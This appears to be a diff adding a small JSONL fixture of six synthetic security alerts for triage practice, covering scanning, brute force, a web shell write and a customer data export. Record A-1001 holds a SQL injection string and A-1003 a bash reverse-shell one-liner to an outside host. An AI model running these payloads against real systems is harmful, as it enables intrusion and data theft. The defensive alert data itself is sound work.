@@ -1,0 +1,7 @@
+{"id":"A-1001","timestamp":"2026-06-20T09:12:11Z","asset":"web-prod-01","asset_criticality":5,"event_type":"web_request","src_ip":"45.91.10.8","dst_ip":"10.10.2.15","payload":"GET /login?id=1 union select password from users--","confidence":0.92}
+{"id":"A-1002","timestamp":"2026-06-20T09:14:03Z","asset":"dev-wiki","asset_criticality":2,"event_type":"scanner","src_ip":"198.51.100.30","dst_ip":"10.10.5.8","payload":"GET /favicon.ico masscan probe","confidence":0.35}
+{"id":"A-1003","timestamp":"2026-06-20T09:17:42Z","asset":"app-prod-02","asset_criticality":5,"event_type":"process_network","src_ip":"10.10.2.22","dst_ip":"203.0.113.77","payload":"bash -c bash -i >& /dev/tcp/203.0.113.77/4444 0>&1","confidence":0.97}
+{"id":"A-1004","timestamp":"2026-06-20T09:21:05Z","asset":"vpn-gateway","asset_criticality":5,"event_type":"auth","src_ip":"203.0.113.19","dst_ip":"10.10.1.2","payload":"failed login for admin repeated 37 times then success","confidence":0.88}
+{"id":"A-1005","timestamp":"2026-06-20T09:23:39Z","asset":"web-prod-01","asset_criticality":5,"event_type":"file_write","src_ip":"10.10.2.15","dst_ip":"10.10.2.15","payload":"created file /var/www/html/upload/shell.jsp with suspicious parameters","confidence":0.94}
+{"id":"A-1006","timestamp":"2026-06-20T09:27:16Z","asset":"db-reporting","asset_criticality":4,"event_type":"file_access","src_ip":"10.10.3.9","dst_ip":"10.10.3.10","payload":"read /backup/customer_export.csv after unusual service account login","confidence":0.81}
+
